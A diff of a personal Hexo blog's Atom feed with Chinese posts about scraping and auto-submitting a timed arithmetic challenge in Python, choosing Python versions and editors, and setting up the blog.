class="line">Sum *= int(getString.split()[4])</span><br><span class="line">Sum += int(getString.split()[0])</span><br><span class="line">Sum -= int(getString.split()[6])</span><br><span class="line"></span><br><span class="line">response = requests.get(&quot;http://123.207.149.64:23331/calculator/?answer=&quot; + &apos;%d&apos; % Sum, cookies=Cookies)</span><br><span class="line"></span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p>后面打算写一篇关于POST传递的使用方式和详细的HTTP请求的相关知识</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;环境说明：&lt;strong&gt;Python 3&lt;/strong&gt;&lt;br&gt;外部依赖：&lt;strong&gt;requests、bs4、BeautifulSoup&lt;/strong&gt;&lt;br&gt;先看题目&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/2019/04/07/Python-简单的网页抓取和提交表单/Image0001.png&quot; alt&gt;&lt;br&gt;题目很简单，就是限时计算给出的算式并提交。&lt;br&gt;&lt;del&gt;方法一、计算器一台。方法很简单只需要在1.5s内计算出结果再提交就行了，大约几千左右的APM就够了。&lt;/del&gt;&lt;br&gt;方法二、&lt;strong&gt;使用网络爬虫&lt;/strong&gt;。&lt;br&gt;爬虫的话自然使用Python是最方便不过的，大体思路就是&lt;strong&gt;抓取公式-&amp;gt;计算-&amp;gt;提交&lt;/strong&gt;。&lt;br&gt;既然是做题那么首先第一步肯定是&lt;strong&gt;化简&lt;/strong&gt;，做题最讨厌的不是不会做而是把1+1做成∞+∞。我们先多刷新几次页面看一下。&lt;br&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>关于Python的使用</title>
+    <link href="https://kkkiona.github.io/2019/04/07/%E5%85%B3%E4%BA%8EPython%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
+    <id>https://kkkiona.github.io/2019/04/07/关于Python的使用/</id>
+    <published>2019-04-07T12:56:59.000Z</published>
+    <updated>2019-04-15T06:08:11.191Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>今天遇到了一道网络爬虫的题目，于是便重新拾起了N年前自己学习的Python 2，下面就说一下Python的相关问题。<br>首先关于Python版本的问题，虽然Python 2 ，Python 3 都在更新，而且据统计显示有70%以上的作者仍在使用Python 2，但是真的非常强烈推荐Python 3。Python 3 不仅仅是对语法做了优化，而且对许多库做了改进、合并。比如Python 2 的urllib和urllib2 在Python 3 中合并为了urllib（其实都不如request）。总之Python 3 是非常值得使用的。<br>下面是一些安装问题，你可以去官网下载Python 3并安装，<a href="https://www.python.org/" target="_blank" rel="noopener">https://www.python.org/</a>  Python 3 的Windows安装包是可以勾选path环境变量的无需手动设置。但相比这样我更推荐使用 anaconda 集成包，里面包含了许多科学包及其依赖，同样是一键安装并且可以自动配置环境变量，<a href="https://www.anaconda.com/" target="_blank" rel="noopener">https://www.anaconda.com/</a>  提供了 Python 2，Python 3 两个版本。<br>关于编辑器，新手可以使用Thonny，十分小巧简洁的Python 编辑器，没有复杂的工程模块，打开软件写就完了，并且自带了Python环境无需提前安装Python即可使用，也可以自己配置解释器。缺点是功能相对较弱。<a href="https://thonny.org/" target="_blank" rel="noopener">https://thonny.org/</a><br><img src="/2019/04/07/关于Python的使用/Image0001.png" alt><br><a id="more"></a><br>比较常见的是pyCharm，操作模式类似于eclipse，功能强大代，码高亮，自动填写做的很好。项目管理很方便，可以跨平台。可以很方便的管理库文件，添加外部依赖等等。提供了免费及收费两个版本。没什么大缺点，就是对外部包引入的搜索方式有时候会让人头大。明明项目里都显示有package了就是import不进来。<a href="https://www.jetbrains.com/pycharm/download/#section=windows" target="_blank" rel="noopener">https://www.jetbrains.com/pycharm/download/#section=windows</a><br><img src="/2019/04/07/关于Python的使用/Image0002.png" alt><br>另外推荐一个交互式笔记本，Jupyter notebook（又称IPython notebook）支持运行超过40种编程语言。安装教程十分简单。跨平台，实时代码编辑。缺点，关键词高亮很差，语法检测很弱，有时候错误语法照样可以运行。<a href="https://jupyter.org/" target="_blank" rel="noopener">https://jupyter.org/</a><br><img src="/2019/04/07/关于Python的使用/Image0003.png" alt><br>对于热衷文本编辑器的人员可以使用sublime，另外C、Java程序员可以使用vs和eclipse。Linux推荐vim。<br>关于同时使用Python 2 和 Python 3，如果确实需要两个环境的话。可以参考这篇文章<a href="https://www.cnblogs.com/zhengyihan1216/p/6011640.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhengyihan1216/p/6011640.html</a><br>简述一下就是安装第一个Python的时候记得把Python.exe改个别名，并且使用pip的时候要对应Python版本，最后分别添加path就可以了。<br>下一篇介绍如何简单的使用 requests package抓取页面和表单提交。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;今天遇到了一道网络爬虫的题目，于是便重新拾起了N年前自己学习的Python 2，下面就说一下Python的相关问题。&lt;br&gt;首先关于Python版本的问题，虽然Python 2 ，Python 3 都在更新，而且据统计显示有70%以上的作者仍在使用Python 2，但是真的非常强烈推荐Python 3。Python 3 不仅仅是对语法做了优化，而且对许多库做了改进、合并。比如Python 2 的urllib和urllib2 在Python 3 中合并为了urllib（其实都不如request）。总之Python 3 是非常值得使用的。&lt;br&gt;下面是一些安装问题，你可以去官网下载Python 3并安装，&lt;a href=&quot;https://www.python.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.python.org/&lt;/a&gt;  Python 3 的Windows安装包是可以勾选path环境变量的无需手动设置。但相比这样我更推荐使用 anaconda 集成包，里面包含了许多科学包及其依赖，同样是一键安装并且可以自动配置环境变量，&lt;a href=&quot;https://www.anaconda.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anaconda.com/&lt;/a&gt;  提供了 Python 2，Python 3 两个版本。&lt;br&gt;关于编辑器，新手可以使用Thonny，十分小巧简洁的Python 编辑器，没有复杂的工程模块，打开软件写就完了，并且自带了Python环境无需提前安装Python即可使用，也可以自己配置解释器。缺点是功能相对较弱。&lt;a href=&quot;https://thonny.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://thonny.org/&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;/2019/04/07/关于Python的使用/Image0001.png&quot; alt&gt;&lt;br&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>First Article</title>
+    <link href="https://kkkiona.github.io/2019/04/03/first%20blog/"/>
+    <id>https://kkkiona.github.io/2019/04/03/first blog/</id>
+    <published>2019-04-03T12:24:54.992Z</published>
+    <updated>2019-04-04T13:05:50.753Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>早上看了一下之前的Github实在是不忍直视<br><img src="https://img-blog.csdnimg.cn/20190403201220137.jpg" alt="在这里插入图片描述"><br>还是重新制作一个吧。<br>使用的是hexo搭建的博客，步骤比较简单。但是在themes选择上真的是强迫症患者的噩梦<img src="https://img-blog.csdnimg.cn/2019040320150486.jpg" alt="在这里插入图片描述">。<br>偏偏就喜欢上了一个已经停止维护的yilia主题，尝试了无数次修改buffer大小之后依然无法使用HTTP下载，还是ssh吧。<br>下载下来之后更是bug一大堆，比如tag。修改了半天总算是基本正常了。</p><p>既然是新做的博客必须好好搞一下，从网易云拉了音乐，另外搞了一下午的图灵机器人，而且失败了。<img src="https://img-blog.csdnimg.cn/2019040320150486.jpg" alt="在这里插入图片描述">。其实hexo 是自带Live2D功能的，但是想做一个高大上的带交友功能的机器人。然而node.js不熟悉挂接图灵接口的时候就是不行，最后无奈先用自带的吧。明天开始研究信息安全。有时间再搞图灵。。<img src="https://img-blog.csdnimg.cn/2019040320224889.gif" alt="在这里插入图片描述"></p>]]></content>
     
     <summary type="html">
     
